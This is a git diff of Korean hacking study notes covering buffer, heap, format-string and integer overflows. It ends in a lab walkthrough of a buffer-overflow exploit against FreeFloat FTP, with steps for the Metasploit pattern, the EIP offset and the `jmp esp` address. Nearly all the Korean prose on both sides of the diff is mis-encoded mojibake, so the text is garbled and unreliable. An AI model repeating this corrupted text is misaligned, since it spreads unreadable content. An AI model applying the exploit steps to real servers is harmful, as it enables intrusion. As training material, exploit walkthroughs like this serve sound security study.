+    - í•œ ë©”ëª¨ë¦¬ê°€ ì„œë¡œ ë‹¤ë¥¸ ë‘ ìŠ¤íŠ¸ë§ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ”ë° í•œê³³ì—ì„œëŠ” a, í•œê³³ì—ì„œëŠ” bë¡œ ì œí•œí•´ì„œ ì‚¬ìš©í•œë‹¤í•˜ìž.
+        - => <ins>í° ìª½ìœ¼ë¡œ ë©”ëª¨ë¦¬ë¥¼ ì±„ìš°ê³  ìž‘ì€ ìª½ì—ì„œ ì‚¬ìš©í•˜ê²Œí•˜ë©´ ìƒëŒ€ì  ê¸¸ì´ì°¨ë¡œ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ë°œìƒ ì‹œí‚¬ìˆ˜ ìžˆë‹¤.</ins>
 
         ```c
-        //¿¹Á¦ 4-10 ) ´õºíÇÁ¸® ¹ö±×¿¡ Ãë¾àÇÑ ÄÚµå
+        //ì˜ˆì œ 4-10 ) ë”ë¸”í”„ë¦¬ ë²„ê·¸ì— ì·¨ì•½í•œ ì½”ë“œ
         #include <stdio.h>
         int main(){
             char* ptr= (char*)malloc(SIZE);
@@ -377,12 +377,12 @@ int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â 
             free(ptr);
         }
         ```
-- ½ºÅÃ ¿µ¿ª
-    - CPU°¡ ½ÇÇàÁß¿¡ ÇÊ¿äÇÑ Á¤º¸¸¦ ÀúÀåÇÏ´Â ¸Þ¸ð¸® ¿µ¿ª
-    - ÇÔ¼öÀÎÀÚ, Áö¿ªº¯¼ö, ½ºÅÃÇÁ·¹ÀÓ ÁÖ¼Ò, ¸®ÅÏÁÖ¼Ò
+- ìŠ¤íƒ ì˜ì—­
+    - CPUê°€ ì‹¤í–‰ì¤‘ì— í•„ìš”í•œ ì •ë³´ë¥¼ ì €ìž¥í•˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­
+    - í•¨ìˆ˜ì¸ìž, ì§€ì—­ë³€ìˆ˜, ìŠ¤íƒí”„ë ˆìž„ ì£¼ì†Œ, ë¦¬í„´ì£¼ì†Œ
 
     ```c
-    //¿¹Á¦ 4-11 ) ½ºÅÃ ±â¹ÝÀÇ ¿À¹öÇÃ·Î¿ì Ãë¾àÁ¡ÀÌ ÀÖ´Â ÇÁ·Î±×·¥
+    //ì˜ˆì œ 4-11 ) ìŠ¤íƒ ê¸°ë°˜ì˜ ì˜¤ë²„í”Œë¡œìš° ì·¨ì•½ì ì´ ìžˆëŠ” í”„ë¡œê·¸ëž¨
     #include <stdio.h>
     #include <string.h>
 
@@ -398,27 +398,27 @@ int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â 
         printf("&buf_two = %p, content = %s\n",&buf_two,buf_two);
     }
     ```
-    - buf_two °¡ buf_oneº¸´Ù ´õ ¾ÕÂÊ ¸Þ¸ð¸®¸¦ Â÷ÁöÇÏ¹Ç·Î 16º¸´Ù ³Ñ´Â ÀÔ·Â°ªÀ» ÁÖ¾úÀ»¶§, buf_two°¡ µ¤¾îÁö¸é¼­ buf_one±îÁö ¿µÇâÀ» ÁØ´Ù.
-- µ¥ÀÌÅÍ ¿µ¿ª
-    - ÇÁ·Î±×·¡¹Ö½Ã Àü¿ªÀûÀ¸·Î »ç¿ëµÇ´Â Á¤º¸¸¦ ÀúÀåÇÏ´Â ¸Þ¸ð¸® ¿µ¿ª
-    - Àü¿ªº¯¼ö, Á¤Àû º¯¼ö
-        - ÃÊ±âÈ­µÈ º¯¼ö ¿µ¿ª(µ¥ÀÌÅÍ¿µ¿ª) 
-            - const Å°¿öµå·Î ¼±¾ðµÈ ÀÐ±â Àü¿ë ¿µ¿ª
-            - ÀÐ±â/¾²±â °°ÀÌµÇ´Â ¿µ¿ª
+    - buf_two ê°€ buf_oneë³´ë‹¤ ë” ì•žìª½ ë©”ëª¨ë¦¬ë¥¼ ì°¨ì§€í•˜ë¯€ë¡œ 16ë³´ë‹¤ ë„˜ëŠ” ìž…ë ¥ê°’ì„ ì£¼ì—ˆì„ë•Œ, buf_twoê°€ ë®ì–´ì§€ë©´ì„œ buf_oneê¹Œì§€ ì˜í–¥ì„ ì¤€ë‹¤.
+- ë°ì´í„° ì˜ì—­
+    - í”„ë¡œê·¸ëž˜ë°ì‹œ ì „ì—­ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ì •ë³´ë¥¼ ì €ìž¥í•˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­
+    - ì „ì—­ë³€ìˆ˜, ì •ì  ë³€ìˆ˜
+        - ì´ˆê¸°í™”ëœ ë³€ìˆ˜ ì˜ì—­(ë°ì´í„°ì˜ì—­) 
+            - const í‚¤ì›Œë“œë¡œ ì„ ì–¸ëœ ì½ê¸° ì „ìš© ì˜ì—­
+            - ì½ê¸°/ì“°ê¸° ê°™ì´ë˜ëŠ” ì˜ì—­
             ```
             ex) char *string ="hello world"; 
-                "hello world" --- ÀÐ±â Àü¿ë ¿µ¿ª
-                static int a=0; global int i=10; ---ÀÐ±â/¾²±â ¿µ¿ª 
+                "hello world" --- ì½ê¸° ì „ìš© ì˜ì—­
+                static int a=0; global int i=10; ---ì½ê¸°/ì“°ê¸° ì˜ì—­ 
             ```
-        -  ÃÊ±âÈ­X º¯¼ö ¿µ¿ª(BSS¿µ¿ª)
-- Èü ¹öÆÛ ¿À¹öÇÃ·Î¿ì
-    - Èü: ÇÁ·Î±×·¥ ¼öÇà½Ã µ¿ÀûÀ¸·Î ÇÒ´çÇÏ°í ÇØÁ¦ÇÏ¸é¼­ »ç¿ëÇÒ ¼ö ÀÖ´Â ¸Þ¸ð¸® ¿µ¿ª
-        - Ã»Å© chunck : µ¿ÀûÀ¸·Î ¸Þ¸ð¸® ÇÒ´ç ÇØÁ¦½Ã »ç¿ëÇÏ´Â ¸Þ¸ð¸® ´ÜÀ§
-    - ÀÎÁ¢ÇÑ ¸Þ¸ð¸® Ã»Å©¸¦ ¼­·Î µ¤¾î¾²´Â ÆÐÅÏ
-        - ¿¬´Þ¾Æ ÇÒ´ç¹ÞÀº ¸Þ¸ð¸®´Â ¼­·Î ÀÎÁ¢ÇÒ È®·üÀÌ ³ôÀ¸¹Ç·Î, Ã³À½ ÇÒ´ç¹ÞÀº ¸Þ¸ð¸® Ã»Å© ºÎºÐÀ» µ¤À¸¸é µÞºÎºÐ¿¡ ÇØ´çÇÏ´Â ¸Þ¸ð¸® Ã»Å© ºÎºÐ¿¡ µ¥ÀÌÅÍ¸¦ ¾µ ¼ö ÀÖ´Ù.
-- **¼±¾ð ¼ø¼­¿¡ µû¸¥ Áö¿ªº¯¼öÀÇ ¸Þ¸ð¸® ¹èÄ¡ ¼ø¼­**
+        -  ì´ˆê¸°í™”X ë³€ìˆ˜ ì˜ì—­(BSSì˜ì—­)
+- íž™ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°
+    - íž™: í”„ë¡œê·¸ëž¨ ìˆ˜í–‰ì‹œ ë™ì ìœ¼ë¡œ í• ë‹¹í•˜ê³  í•´ì œí•˜ë©´ì„œ ì‚¬ìš©í•  ìˆ˜ ìžˆëŠ” ë©”ëª¨ë¦¬ ì˜ì—­
+        - ì²­í¬ chunck : ë™ì ìœ¼ë¡œ ë©”ëª¨ë¦¬ í• ë‹¹ í•´ì œì‹œ ì‚¬ìš©í•˜ëŠ” ë©”ëª¨ë¦¬ ë‹¨ìœ„
+    - ì¸ì ‘í•œ ë©”ëª¨ë¦¬ ì²­í¬ë¥¼ ì„œë¡œ ë®ì–´ì“°ëŠ” íŒ¨í„´
+        - ì—°ë‹¬ì•„ í• ë‹¹ë°›ì€ ë©”ëª¨ë¦¬ëŠ” ì„œë¡œ ì¸ì ‘í•  í™•ë¥ ì´ ë†’ìœ¼ë¯€ë¡œ, ì²˜ìŒ í• ë‹¹ë°›ì€ ë©”ëª¨ë¦¬ ì²­í¬ ë¶€ë¶„ì„ ë®ìœ¼ë©´ ë’·ë¶€ë¶„ì— í•´ë‹¹í•˜ëŠ” ë©”ëª¨ë¦¬ ì²­í¬ ë¶€ë¶„ì— ë°ì´í„°ë¥¼ ì“¸ ìˆ˜ ìžˆë‹¤.
+- **ì„ ì–¸ ìˆœì„œì— ë”°ë¥¸ ì§€ì—­ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ ë°°ì¹˜ ìˆœì„œ**
     ```c
-    //¿¹Á¦ 4-12 ) °¢ º¯¼öÀÇ ¸Þ¸ð¸® ÁÖ¼Ò¸¦ Ãâ·ÂÇÏ´Â ÇÁ·Î±×·¥
+    //ì˜ˆì œ 4-12 ) ê° ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì¶œë ¥í•˜ëŠ” í”„ë¡œê·¸ëž¨
     #include <stdio.h>
     int main(){
         int buf11, buf12;
@@ -427,16 +427,16 @@ int¸¦ ¹®ÀÚ¿­Ã³·³ »ç¿ëÇÏ´Â °æ¿ìÀÏ»Ó. °³¹ßÀÚ°¡ Ã³À½ ÇÁ·Î±×·¥ÀÇ ±¸Á¶¸¦ ¼³°èÇÒ ¶§´Â 
         printf("&buf21 = %p, &buf22 = %p\n",&buf21,&buf22);
     }
     ```
-    - buf22 buf21 buf12 buf11 ¼øÀ¸·Î ÁÖ¼Ò°¡ Á¤·ÄµÇ¾îÀÖÀ½.
-    > Áö¿ªº¯¼ö´Â ¸¶Áö¸·¿¡ ¼±¾ðÇÒ¼ö·Ï ¾ÕºÎºÐ(³·ÀºÁÖ¼Ò)¿¡ ¹èÄ¡µÈ´Ù.
-- **¿Ã¸®µð¹ö°Å JIT ¼³Á¤**
-    - JIT : ÇöÀç ¹®Á¦°¡ ¹ß»ýÇÑ ÇÁ·Î¼¼½º¿¡ ±×´ë·Î µð¹ö°Å¸¦ ¿¬°áÇØ ºÐ¼®ÇÏ´Â ¹æ¹ý
-        - ÇÁ·Î±×·¥ÀÌ ½ÇÇàÁß ¿¹»óÄ¡ ¸øÇÑ ¹ö±×·Î Á×¾î¹ö¸®´Â °æ¿ì ¿øÀÎ ºÐ¼®ÇÏ´Âµ¥ »ç¿ë
+    - buf22 buf21 buf12 buf11 ìˆœìœ¼ë¡œ ì£¼ì†Œê°€ ì •ë ¬ë˜ì–´ìžˆìŒ.
+    > ì§€ì—­ë³€ìˆ˜ëŠ” ë§ˆì§€ë§‰ì— ì„ ì–¸í• ìˆ˜ë¡ ì•žë¶€ë¶„(ë‚®ì€ì£¼ì†Œ)ì— ë°°ì¹˜ëœë‹¤.
+- **ì˜¬ë¦¬ë””ë²„ê±° JIT ì„¤ì •**
+    - JIT : í˜„ìž¬ ë¬¸ì œê°€ ë°œìƒí•œ í”„ë¡œì„¸ìŠ¤ì— ê·¸ëŒ€ë¡œ ë””ë²„ê±°ë¥¼ ì—°ê²°í•´ ë¶„ì„í•˜ëŠ” ë°©ë²•
+        - í”„ë¡œê·¸ëž¨ì´ ì‹¤í–‰ì¤‘ ì˜ˆìƒì¹˜ ëª»í•œ ë²„ê·¸ë¡œ ì£½ì–´ë²„ë¦¬ëŠ” ê²½ìš° ì›ì¸ ë¶„ì„í•˜ëŠ”ë° ì‚¬ìš©
     ![alt text](img/image2.png)
-#### Çü½Ä ¹®ÀÚ¿­
-- Çü½Ä ¹®ÀÚ¿­ format string : Ãâ·Â°ªÀ» ÀÏÁ¤ÇÑ ¾ç½Ä¿¡ ¸Â°Ô ÅëÀÏ½ÃÅ°±â À§ÇØ »ç¿ëÇÏ´Â ±Ô°ÝÀ» Á¤ÇÏ´Â ¹®ÀÚ¿­
+#### í˜•ì‹ ë¬¸ìžì—´
+- í˜•ì‹ ë¬¸ìžì—´ format string : ì¶œë ¥ê°’ì„ ì¼ì •í•œ ì–‘ì‹ì— ë§žê²Œ í†µì¼ì‹œí‚¤ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” ê·œê²©ì„ ì •í•˜ëŠ” ë¬¸ìžì—´
 ```c
-//¿¹Á¦ 4-13 ) Çü½Ä ¹®ÀÚ¿­ »ç¿ë ¿¹Á¦
+//ì˜ˆì œ 4-13 ) í˜•ì‹ ë¬¸ìžì—´ ì‚¬ìš© ì˜ˆì œ
 #include <stdio.h>
 using namespace std;
 
@@ -449,10 +449,10 @@ int main(){
 }
 ```
 
-- Æ÷¸Ë½ºÆ®¸µ Ãë¾àÁ¡ : Æ÷¸Ë½ºÆ®¸µÀ» »ç¿ëÇÏ´Â ÇÔ¼öÀÇ ÀÔ·ÂÀ» »ç¿ëÀÚ°¡ ÀÓÀÇ·Î Á¶ÀÛÇÒ ¼ö ÀÖÀ»¶§ ¹ß»ý
+- í¬ë§·ìŠ¤íŠ¸ë§ ì·¨ì•½ì  : í¬ë§·ìŠ¤íŠ¸ë§ì„ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ì˜ ìž…ë ¥ì„ ì‚¬ìš©ìžê°€ ìž„ì˜ë¡œ ì¡°ìž‘í•  ìˆ˜ ìžˆì„ë•Œ ë°œìƒ
 
 ```c
-//¿¹Á¦ 4-14 ) Çü½Ä ¹®ÀÚ¿­ Ãë¾àÁ¡ÀÌ ÀÖ´Â ¼Ò½º ÄÚµå
+//ì˜ˆì œ 4-14 ) í˜•ì‹ ë¬¸ìžì—´ ì·¨ì•½ì ì´ ìžˆëŠ” ì†ŒìŠ¤ ì½”ë“œ
 #include <stdio.h>
 int main(int argc, char* argv[]){
     if(argc!=2){
@@ -461,18 +461,18 @@ int main(int argc, char* argv[]){
     printf(argv[1]);
 }
 ```
-- Ã¹¹øÂ° ÀÎÀÚ·Î ÁÖ¾îÁø ¹®ÀÚ¿­À» ±×´ë·Î Ãâ·ÂÇÏ´Â ÇÁ·Î±×·¥.
- `./example "%x %x %x %x %x %x"`³ÖÀ¸¸é ¸Þ¸ð¸®¿¡ ÀÖ´Â ¾î¶² °ªµéÀ» Ãâ·ÂÇÔ.
-    - ¿ø·¡ È£ÃâµÇ¾î¾ßÇÒ ¸ð¾çÀº printf("%x %x %x %x %x",v1,v2,v3,v4,v5); ÀÌ´Ù.
-    - v1~v5´Â ½ºÅÃÀÇ ¾îµò°¡¿¡ ÀúÀåÀÌ µÉ °Í ÀÌ´Ù.( ½ºÅÃÀº ÇÔ¼ö¿¡ Àü´ÞÇÒ ÀÎÀÚ¸¦ ÀúÀåÇÏ´Â ¿ªÇÒÀ» ÇÔ)
-    - µû¶ó¼­ °á°ú°ªÀº %x¿¡ ´ëÀÀµÇ´Â ¸Þ¸ð¸® ³»¿ëÀ» Ãâ·ÂÇÑ´Ù.
-#### Á¤¼ö ¿À¹öÇÃ·Î¿ì/¾ð´õÇÃ·Î¿ì °ø°Ý
-- ÀÏ¹ÝÀû ¿À¹öÇÃ·Î¿ì : `strcpy()`,`memcp()` µîÀÇ °æ°è°ªÀ» Á¦´ë·Î Ã¼Å©ÇÏÁö ¾ÊÀº º¯¼ö º¹¼öÀÇ ¹®Á¦¸¦ ÀÌ¿ëÇÑ °ø°Ý¹ý.
-- Á¤¼ö ¿À¹öÇÃ·Î¿ì : ¿¬»ê°á°ú°¡ ÀúÀåÇÏ·Á´Â µ¥ÀÌÅÍ Å¸ÀÔÀÌ Ç¥ÇöÇÒ ¼ö ÀÖ´Â ¹üÀ§¸¦ ¹þ¾î³ª´Â°Í
-    - ¿¬»ê °á°ú°¡ µ¥ÀÌÅÍÅ¸ÀÔÀÌ ÀúÀåÇÒ ¼ö ÀÖ´Â ÃÖ´ë°ªº¸´Ù Å©¸é ¿À¹öÇÃ·Î¿ì, ÃÖ¼Ò°ªº¸´Ù ÀÛÀ¸¸é ¾ð´õÇÃ·Î¿ì
-    - Á¤¼öÇü µ¥ÀÌÅÍÅ¸ÀÔÀ» »ç¿ëÇÏ´Â ¸ðµç ÇÁ·Î±×·¥Àº Á¤¼öÇü ¿À¹öÇÃ·Î¿ì°¡ ¹ß»ý °¡´É
+- ì²«ë²ˆì§¸ ì¸ìžë¡œ ì£¼ì–´ì§„ ë¬¸ìžì—´ì„ ê·¸ëŒ€ë¡œ ì¶œë ¥í•˜ëŠ” í”„ë¡œê·¸ëž¨.
+ `./example "%x %x %x %x %x %x"`ë„£ìœ¼ë©´ ë©”ëª¨ë¦¬ì— ìžˆëŠ” ì–´ë–¤ ê°’ë“¤ì„ ì¶œë ¥í•¨.
+    - ì›ëž˜ í˜¸ì¶œë˜ì–´ì•¼í•  ëª¨ì–‘ì€ printf("%x %x %x %x %x",v1,v2,v3,v4,v5); ì´ë‹¤.
+    - v1~v5ëŠ” ìŠ¤íƒì˜ ì–´ë”˜ê°€ì— ì €ìž¥ì´ ë  ê²ƒ ì´ë‹¤.( ìŠ¤íƒì€ í•¨ìˆ˜ì— ì „ë‹¬í•  ì¸ìžë¥¼ ì €ìž¥í•˜ëŠ” ì—­í• ì„ í•¨)
+    - ë”°ë¼ì„œ ê²°ê³¼ê°’ì€ %xì— ëŒ€ì‘ë˜ëŠ” ë©”ëª¨ë¦¬ ë‚´ìš©ì„ ì¶œë ¥í•œë‹¤.
+#### ì •ìˆ˜ ì˜¤ë²„í”Œë¡œìš°/ì–¸ë”í”Œë¡œìš° ê³µê²©
+- ì¼ë°˜ì  ì˜¤ë²„í”Œë¡œìš° : `strcpy()`,`memcp()` ë“±ì˜ ê²½ê³„ê°’ì„ ì œëŒ€ë¡œ ì²´í¬í•˜ì§€ ì•Šì€ ë³€ìˆ˜ ë³µìˆ˜ì˜ ë¬¸ì œë¥¼ ì´ìš©í•œ ê³µê²©ë²•.
+- ì •ìˆ˜ ì˜¤ë²„í”Œë¡œìš° : ì—°ì‚°ê²°ê³¼ê°€ ì €ìž¥í•˜ë ¤ëŠ” ë°ì´í„° íƒ€ìž…ì´ í‘œí˜„í•  ìˆ˜ ìžˆëŠ” ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ”ê²ƒ
+    - ì—°ì‚° ê²°ê³¼ê°€ ë°ì´í„°íƒ€ìž…ì´ ì €ìž¥í•  ìˆ˜ ìžˆëŠ” ìµœëŒ€ê°’ë³´ë‹¤ í¬ë©´ ì˜¤ë²„í”Œë¡œìš°, ìµœì†Œê°’ë³´ë‹¤ ìž‘ìœ¼ë©´ ì–¸ë”í”Œë¡œìš°
+    - ì •ìˆ˜í˜• ë°ì´í„°íƒ€ìž…ì„ ì‚¬ìš©í•˜ëŠ” ëª¨ë“  í”„ë¡œê·¸ëž¨ì€ ì •ìˆ˜í˜• ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒ ê°€ëŠ¥
     ```c
-    //¿¹Á¦ 4-15 ) Á¤¼öÇü ¿À¹öÇÃ·Î¿ì ¹ß»ý
+    //ì˜ˆì œ 4-15 ) ì •ìˆ˜í˜• ì˜¤ë²„í”Œë¡œìš° ë°œìƒ
     #include <stdio.h>
     int main(){
         int a=1234567890;
@@ -484,16 +484,16 @@ int main(int argc, char* argv[]){
         printf("a + b = %d\n",a+b);
     }
     ```
-### ½ÇÀü
+### ì‹¤ì „
 ---
-- FreeFloat FTP : »ç¿ëÀÚ°¡ ·Î±×ÀÎ¿¡ ¼º°øÇÑ ÀÌÈÄ Æ¯Á¤ ¸í·É¾î¿¡ ÀÎÀÛ¹åÀ» ¹ÞÀ» ¶§ ±æÀÌ¸¦ È®ÀÎÇÏÁöX
-#### Å©·¡½Ã ¹ß»ý½ÃÅ°±â
-- ¸Þ¸ð¸® ¿À¿° °ø°Ý
-    1. ÇÁ·Î±×·¥ÀÌ ½ÇÇàÁß¿¡ Á×´Â Çö»óÀ» ÀçÇöÇÏ´Â POC(proof of concept) ÄÚµå ÀÛ¼ºÇÏ±â
-        - POCÄÚµå¸¦ Á¡ÁøÀûÀ¸·Î °è¼Ó Á¤Á¦ÇØ ´õ¿í Á¤±³ÇÑ °ø°Ý ÄÚµå¸¦ ¸¸µé ¼ö ÀÖ´Ù.
-    - free float FTP¸¦ ´ë»óÀ¸·Î °ø°ÝÀ» ÇØº¸ÀÚ. ¸ÕÀú ftpserver.exe ¸¦ ½ÇÇà½ÃÅ°°í ÇØ´ç ÁÖ¼Ò¿Í Æ÷Æ®·Î ¼­¹ö¿¬°áÀ» ÇØÁØ´Ù. `nc 192.168.227.1 21`
-    - ±âº»À¸·Î »ý¼ºµÇ´Â anoymous °èÁ¤¿¡ ·Î±×ÀÎÀ» ÇØÁØ´Ù.
-    - ¹öÆÛ ¿À¹öÇÃ·Î¿ì¸¦ ¹ß»ý½ÃÅ°´Â °ø°Ý ÄÚµå¸¦ Àü¼ÛÇÑ´Ù
+- FreeFloat FTP : ì‚¬ìš©ìžê°€ ë¡œê·¸ì¸ì— ì„±ê³µí•œ ì´í›„ íŠ¹ì • ëª…ë ¹ì–´ì— ì¸ìž‘ë°§ì„ ë°›ì„ ë•Œ ê¸¸ì´ë¥¼ í™•ì¸í•˜ì§€X
+#### í¬ëž˜ì‹œ ë°œìƒì‹œí‚¤ê¸°
+- ë©”ëª¨ë¦¬ ì˜¤ì—¼ ê³µê²©
+    1. í”„ë¡œê·¸ëž¨ì´ ì‹¤í–‰ì¤‘ì— ì£½ëŠ” í˜„ìƒì„ ìž¬í˜„í•˜ëŠ” POC(proof of concept) ì½”ë“œ ìž‘ì„±í•˜ê¸°
+        - POCì½”ë“œë¥¼ ì ì§„ì ìœ¼ë¡œ ê³„ì† ì •ì œí•´ ë”ìš± ì •êµí•œ ê³µê²© ì½”ë“œë¥¼ ë§Œë“¤ ìˆ˜ ìžˆë‹¤.
+    - free float FTPë¥¼ ëŒ€ìƒìœ¼ë¡œ ê³µê²©ì„ í•´ë³´ìž. ë¨¼ì € ftpserver.exe ë¥¼ ì‹¤í–‰ì‹œí‚¤ê³  í•´ë‹¹ ì£¼ì†Œì™€ í¬íŠ¸ë¡œ ì„œë²„ì—°ê²°ì„ í•´ì¤€ë‹¤. `nc 192.168.227.1 21`
+    - ê¸°ë³¸ìœ¼ë¡œ ìƒì„±ë˜ëŠ” anoymous ê³„ì •ì— ë¡œê·¸ì¸ì„ í•´ì¤€ë‹¤.
+    - ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ê³µê²© ì½”ë“œë¥¼ ì „ì†¡í•œë‹¤
     ```py
     import socket
     import sys
@@ -515,31 +515,31 @@ int main(int argc, char* argv[]){
     ```
     ![alt text](img/image-4.png)
     ![alt text](img/image-1.png)
-    - ÀÚµ¿À¸·Î ¼­¹ö°¡ Á¾·áµÇ°í ÀÛ¾÷Ã¢¿¡ ÀÖ´ø ftpserver ÇÁ·Î±×·¥ÀÌ ²¨Áø °ÍÀ» º¼ ¼ö ÀÖ´Ù.
-    - ollydbg ÀÇ file > attach ·Î ½ÇÇàÁßÀÎ ÇÁ·Î¼¼½º¸¦ ºÐ¼®ÇÒ ¼ö ÀÖ´Ù´Âµ¥, ½ÇÇàÁßÀÎ ÇÁ·Î¼¼½º°¡ ³ªÅ¸³ªÁö¾Ê¾Æ¼­ °ø°ÝÄÚµå·Î Á×Àº ÇÁ·Î¼¼½º¸¦ µð¹ö±ë ÇÏÁø ¸øÇß´Ù. ¤Ð¤Ð
-#### EIP µ¤¾î¾²±â
-- ÀÔ·ÂÇÑ ¹öÆÛ Áß ¾î´À ºÎºÐÀÌ ETP·Î µ¤¾î½áÁö´ÂÁö È®ÀÎÇÏÀÚ.
-    - "A"*1000 ´ë½Å metasploit patternÀ» ÀÌ¿ëÇØ bufferº¯¼ö¿¡ ÀÖ´Â ³»¿ëÀ» ´Ù½Ã º¸³½´Ù. (±âÁ¸¿¡ º¸³Â´ø ¹öÆÛ Å©±â¿Í ¶È°°ÀÌ º¸³»¾ßÇÔ)
-    1. ¸ÞÅ¸½ºÇÃ·ÎÀÕ(·çºñ·Î¸¸µç ÀÍ½ºÇÃ·ÎÀÕ ÄÚµå)À» ÀÌ¿ëÇÑ ÆÐÅÏ »ý¼º
+    - ìžë™ìœ¼ë¡œ ì„œë²„ê°€ ì¢…ë£Œë˜ê³  ìž‘ì—…ì°½ì— ìžˆë˜ ftpserver í”„ë¡œê·¸ëž¨ì´ êº¼ì§„ ê²ƒì„ ë³¼ ìˆ˜ ìžˆë‹¤.
+    - ollydbg ì˜ file > attach ë¡œ ì‹¤í–‰ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ë¶„ì„í•  ìˆ˜ ìžˆë‹¤ëŠ”ë°, ì‹¤í–‰ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ê°€ ë‚˜íƒ€ë‚˜ì§€ì•Šì•„ì„œ ê³µê²©ì½”ë“œë¡œ ì£½ì€ í”„ë¡œì„¸ìŠ¤ë¥¼ ë””ë²„ê¹… í•˜ì§„ ëª»í–ˆë‹¤. ã… ã… 
+#### EIP ë®ì–´ì“°ê¸°
+- ìž…ë ¥í•œ ë²„í¼ ì¤‘ ì–´ëŠ ë¶€ë¶„ì´ ETPë¡œ ë®ì–´ì¨ì§€ëŠ”ì§€ í™•ì¸í•˜ìž.
+    - "A"*1000 ëŒ€ì‹  metasploit patternì„ ì´ìš©í•´ bufferë³€ìˆ˜ì— ìžˆëŠ” ë‚´ìš©ì„ ë‹¤ì‹œ ë³´ë‚¸ë‹¤. (ê¸°ì¡´ì— ë³´ëƒˆë˜ ë²„í¼ í¬ê¸°ì™€ ë˜‘ê°™ì´ ë³´ë‚´ì•¼í•¨)
+    1. ë©”íƒ€ìŠ¤í”Œë¡œìž‡(ë£¨ë¹„ë¡œë§Œë“  ìµìŠ¤í”Œë¡œìž‡ ì½”ë“œ)ì„ ì´ìš©í•œ íŒ¨í„´ ìƒì„±
     ![alt text](img/image-2.png)
-    2. POC.py ÇØ´ç ÆÐÅÏÀ¸·Î ¼öÁ¤ ÈÄ ½ÇÇà
-        - ·¹Áö½ºÅÍ°ªÀÌ ¿ì¸®°¡ÀÔ·ÂÇÑ °ªÀ¸·Î ¹Ù²î°ÔµÊ.
-        - ·¹Áö½ºÅÍµéÀÌ ¾î´À À§Ä¡¿¡ ÇØ´çÇÏ´Â °ªÀ¸·Î ¹Ù²î´ÂÁö ½±°Ô È®ÀÎ °¡´É
+    2. POC.py í•´ë‹¹ íŒ¨í„´ìœ¼ë¡œ ìˆ˜ì • í›„ ì‹¤í–‰
+        - ë ˆì§€ìŠ¤í„°ê°’ì´ ìš°ë¦¬ê°€ìž…ë ¥í•œ ê°’ìœ¼ë¡œ ë°”ë€Œê²Œë¨.
+        - ë ˆì§€ìŠ¤í„°ë“¤ì´ ì–´ëŠ ìœ„ì¹˜ì— í•´ë‹¹í•˜ëŠ” ê°’ìœ¼ë¡œ ë°”ë€ŒëŠ”ì§€ ì‰½ê²Œ í™•ì¸ ê°€ëŠ¥
     ![alt text](img/image-3.png)
-    3. ÇØ´çÇÏ´Â °¢ À§Ä¡·Î evil º¯¼ö¸¦ Àç±¸¼ºÇÏ¸é
-        - `evil = "A"*247 + "B"*4 + "C"*8 + "D"*741 ·Î ¾µ ¼ö ÀÖ´Ù.
-        - ÀÌ °ªÀ¸·Î º¸³»¸é BBBB·Î EIP°¡ µ¤¾î½áÁö´Â °ÍÀ» º¼ ¼ö ÀÖÀ½
-        - ESP°¡ Á¤È®È÷ DDDD·Î ½ÃÀÛÇÏ´Â ¹®ÀÚ¿­À» °¡¸®Å´µµ º¼ ¼ö ÀÖÀ½
-    4. ÁÖ¼Ò¿¡ ¸Ç Ã³À½ ¾ð±ÞÇß´ø "\0x00\x0a\x0d"°¡ ¾ø¾îÁ®¾ßÇÔ
-        - `jmp esp` À§Ä¡¸¦ Ã£±â -> "\xff\xe4"
-        - ollydbg ÀÇ memory map Ã¢ ¿­°í ¸¶¿ì½º ¿À¸¥ÂÊ ¹öÆ°À¸·Î ÄÁÅ×½ºÆ® ¸Þ´º¸¦ ¶ç¿î ÈÄ Search Ã¢À» ¶ç¿ö hex°ªÀ¸·Î °Ë»öÇÏ°íÀÚ ÇÏ´Â °ªÀ» Ã£À¸¸éµÊ
-        - ¿©±â¼­ text ¿µ¿ª¿¡¼­ Ã£Àº °ª Áß 0x773f346a¿¡ÀÖ´Â °ªÀ» »ç¿ë
-        - ÀÌ ÁÖ¼Ò·Î EIP ¸¦ µ¤´Â ÄÚµå¸¦ ¼öÁ¤ÇÏÀÚ
-    5. ¸®Æ²¿£µð¾È °í·Á
+    3. í•´ë‹¹í•˜ëŠ” ê° ìœ„ì¹˜ë¡œ evil ë³€ìˆ˜ë¥¼ ìž¬êµ¬ì„±í•˜ë©´
+        - `evil = "A"*247 + "B"*4 + "C"*8 + "D"*741 ë¡œ ì“¸ ìˆ˜ ìžˆë‹¤.
+        - ì´ ê°’ìœ¼ë¡œ ë³´ë‚´ë©´ BBBBë¡œ EIPê°€ ë®ì–´ì¨ì§€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìžˆìŒ
+        - ESPê°€ ì •í™•ížˆ DDDDë¡œ ì‹œìž‘í•˜ëŠ” ë¬¸ìžì—´ì„ ê°€ë¦¬í‚´ë„ ë³¼ ìˆ˜ ìžˆìŒ
+    4. ì£¼ì†Œì— ë§¨ ì²˜ìŒ ì–¸ê¸‰í–ˆë˜ "\0x00\x0a\x0d"ê°€ ì—†ì–´ì ¸ì•¼í•¨
+        - `jmp esp` ìœ„ì¹˜ë¥¼ ì°¾ê¸° -> "\xff\xe4"
